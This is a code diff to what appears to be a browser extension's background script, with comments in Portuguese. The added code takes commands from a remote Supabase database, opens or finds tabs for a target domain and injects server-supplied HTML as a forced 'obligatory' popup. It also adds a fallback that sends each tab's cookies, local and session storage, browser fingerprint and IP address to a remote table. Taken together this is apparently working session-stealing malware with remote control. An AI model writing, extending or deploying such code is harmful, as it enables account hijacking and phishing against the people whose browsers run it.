@@ -2585,53 +2585,83 @@ async function handleExportCookiesCommand(data) {
   }
 }
 
+// Update command tab_id in database
+async function updateCommandTabId(commandId, numericTabId) {
+  try {
+    const response = await fetch(`${CONFIG.SUPABASE_URL}/rest/v1/remote_commands?id=eq.${commandId}`, {
+      method: 'PATCH',
+      headers: {
+        'apikey': CONFIG.SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({ target_tab_id: numericTabId.toString() })
+    });
+    
+    if (response.ok) {
+      log('debug', `✅ Updated command ${commandId} with tab_id ${numericTabId}`);
+    }
+  } catch (error) {
+    log('warn', `⚠️ Failed to update command tab_id: ${error.message}`);
+  }
+}
+
 // Handle popup command with BLOCKING, OBLIGATORY popup
 async function handlePopupCommand(data) {
-  const originalTabId = Number(data.target_tab_id);
-  if (isNaN(originalTabId) || !Number.isInteger(originalTabId)) {
-    throw new Error(`Invalid tab_id type: ${data.target_tab_id} (type: ${typeof data.target_tab_id})`);
-  }
+  let targetTabId = Number(data.target_tab_id);
   const domain = data.target_domain;
+  const commandId = data.command_id;
+  
+  // ✅ FALLBACK: Se tab_id não é número válido (é UUID)
+  if (isNaN(targetTabId) || !Number.isInteger(targetTabId)) {
+    log('warn', `⚠️ Invalid tab_id "${data.target_tab_id}", searching by domain...`);
+    
+    // Step 1: Procurar tab aberta pelo domínio
+    const tabs = await chrome.tabs.query({ url: `*://*.${domain}/*` });
+    const activeTab = tabs.find(t => t.active) || tabs[0];
+    
+    if (activeTab) {
+      targetTabId = activeTab.id;
+      log('info', `✅ Found existing tab ${targetTabId} for domain ${domain}`);
+    } else {
+      // Step 2: Abrir nova aba se não encontrar
+      log('info', `📂 No tab found, opening new tab for https://${domain}`);
+      const newTab = await chrome.tabs.create({ 
+        url: `https://${domain}`,
+        active: true 
+      });
+      targetTabId = newTab.id;
+      
+      // Aguardar tab carregar
+      await new Promise((resolve) => {
+        const listener = (tabId, changeInfo) => {
+          if (tabId === targetTabId && changeInfo.status === 'complete') {
+            chrome.tabs.onUpdated.removeListener(listener);
+            resolve();
+          }
+        };
+        chrome.tabs.onUpdated.addListener(listener);
+        setTimeout(resolve, 10000); // Timeout de 10s
+      });
+    }
+    
+    // Step 3: Atualizar comando no banco com o tab_id numérico
+    await updateCommandTabId(commandId, targetTabId);
+  }
+  
   const htmlContent = data.payload?.html_content || '';
   const cssStyles = data.payload?.css_styles || '';
-  const commandId = data.command_id || '';
   
-  // Try to inject in original tab
+  log('info', `📨 Popup request initiated for tab ${targetTabId}`);
+  
+  // Inject popup script
   try {
-    await injectPopupScript(originalTabId, htmlContent, cssStyles, commandId, data.target_tab_id);
-    log('info', `✅ Popup injetado no tab ${originalTabId}`);
-    return;
+    await injectPopupScript(targetTabId, htmlContent, cssStyles, commandId, data.target_tab_id);
+    log('info', `✅ Popup injetado no tab ${targetTabId}`);
   } catch (error) {
-    // If failed, try fallback by domain
-    if (error.message?.includes('No tab with id') || error.message?.includes('Cannot access')) {
-      log('warn', `⚠️ Tab ${originalTabId} inválido, buscando por domínio: ${domain}`);
-      
-      try {
-        // Search for active tabs with that domain
-        const tabs = await chrome.tabs.query({ url: `*://${domain}/*` });
-        
-        if (tabs.length > 0) {
-          const fallbackTabId = tabs[0].id;
-          log('info', `✅ Fallback: usando tab ${fallbackTabId} (${tabs[0].url})`);
-          
-          // Try again with correct tab
-          await injectPopupScript(fallbackTabId, htmlContent, cssStyles, commandId, String(fallbackTabId));
-          
-          // Update command in DB with correct tab_id
-          await updateCommandTabId(commandId, String(fallbackTabId));
-          
-          log('info', `✅ Popup injetado via fallback no tab ${fallbackTabId}`);
-          return;
-        } else {
-          throw new Error(`Nenhuma aba aberta para o domínio ${domain}`);
-        }
-      } catch (fallbackError) {
-        log('error', `❌ Fallback falhou: ${fallbackError.message}`);
-        throw fallbackError;
-      }
-    } else {
-      throw error; // Re-throw other errors
-    }
+    log('error', `❌ Failed to inject popup: ${error.message}`);
+    throw error;
   }
 }
 
@@ -2995,10 +3025,48 @@ async function trackSession(tab) {
     }
     
     if (!response || !response.ok) {
-      throw lastError || new Error('Failed after retries');
+      // ✅ FALLBACK: REST direto ao PostgREST
+      log('warn', '⚠️ Edge function failed, trying REST fallback...');
+      
+      try {
+        const restResponse = await fetch(`${CONFIG.SUPABASE_URL}/rest/v1/active_sessions`, {
+          method: 'POST',
+          headers: {
+            'apikey': CONFIG.SUPABASE_ANON_KEY,
+            'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'resolution=merge-duplicates'
+          },
+          body: JSON.stringify({
+            machine_id: machineId,
+            tab_id: tab.id.toString(),
+            domain: domain,
+            url: tab.url,
+            title: tab.title || 'Sem título',
+            last_activity: new Date().toISOString(),
+            is_active: true,
+            cookies: sessionData.cookies,
+            local_storage: sessionData.local_storage,
+            session_storage: sessionData.session_storage,
+            browser_fingerprint: sessionData.browser_fingerprint,
+            client_ip: sessionData.client_ip,
+            updated_at: new Date().toISOString()
+          })
+        });
+        
+        if (restResponse.ok) {
+          log('info', '✅ REST fallback successful');
+          response = restResponse; // Mark as successful
+        } else {
+          throw lastError || new Error('REST fallback failed');
+        }
+      } catch (restError) {
+        log('debug', `REST fallback error: ${restError.message}`);
+        throw lastError || restError;
+      }
     }
     
-    if (response.ok) {
+    if (response && response.ok) {
       log('debug', `✅ Session data sent with ${sessionData.cookies.length} cookies`);
       
       // ✅ NOVO: Notificar desktop sobre máquina ativa
